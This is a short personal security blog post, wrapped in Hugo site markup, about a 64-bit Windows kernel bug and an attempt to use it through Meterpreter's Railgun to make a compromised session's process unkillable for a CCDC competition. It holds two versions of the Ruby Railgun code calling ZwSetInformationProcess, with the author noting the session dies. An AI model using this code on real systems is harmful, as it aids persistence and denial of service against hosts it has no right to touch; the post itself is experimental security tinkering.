@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.14" />
+
+  <title>
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://localhost:1313/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Unkillable Processes</h1>
+  <h2></h2>
+</div>
+<div class="content">
+  <p>Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process:
+Blog post: <a href="http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html">http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html</a></p>
+
+<p>Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had.</p>
+
+<p>Started with the C code for the bug: <a href="http://pastebin.com/QejGQXib">http://pastebin.com/QejGQXib</a> along with the only resource I could find about the actual function: <a href="http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a">http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a</a></p>
+
+<p>I came up with this:</p>
+
+<pre><code class="language-ruby">client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[
+   [&quot;DWORD&quot;,&quot;ProcessHandle&quot;,&quot;in&quot;],
+   [&quot;DWORD&quot;,&quot;ProcessInformationClass&quot;,&quot;in&quot;],
+   [&quot;DWORD&quot;,&quot;ProcessInformation&quot;,&quot;inout&quot;],
+   [&quot;DWORD&quot;,&quot;ProcessInformationLength&quot;,&quot;in&quot;],
+])
+processinfo = 0x8000F129
+tproc = client.sys.process.open
+tmem = tproc.memory.allocate(4)
+tproc.memory.write(tmem,processinfo)
+cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return']
+client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,tmem,0x4)
+</code></pre>
+
+<p>ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.</p>
+
+<p>The result:</p>
+
+<pre><code class="language-ruby">client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[
+     [&quot;HANDLE&quot;,&quot;ProcessHandle&quot;,&quot;in&quot;],
+     [&quot;DWORD&quot;,&quot;ProcessInformationClass&quot;,&quot;in&quot;],
+     [&quot;PDWORD&quot;,&quot;ProcessInformation&quot;,&quot;inout&quot;],
+     [&quot;DWORD&quot;,&quot;ProcessInformationLength&quot;,&quot;in&quot;],
+])
+processinfo = 0x8000F129
+cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return']
+client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,processinfo,0x4)
+</code></pre>
+
+<p>Which results in a process that you can&rsquo;t kill, but the process is also non-functioning as far as I can tell because the Meterpreter session dies.</p>
+
+<p>I&rsquo;m curious if with some tweaking I can get it to act much like the KillMe.exe
+<a href="https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe">https://code.google.com/p/ollytlscatch/downloads/detail?name=KillMe.exe</a></p>
+
+<p>Which continues to operate just fine after the modification happens.</p>
+
+</div>
+
+</div>
+</div>
+<script src="http://localhost:1313/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
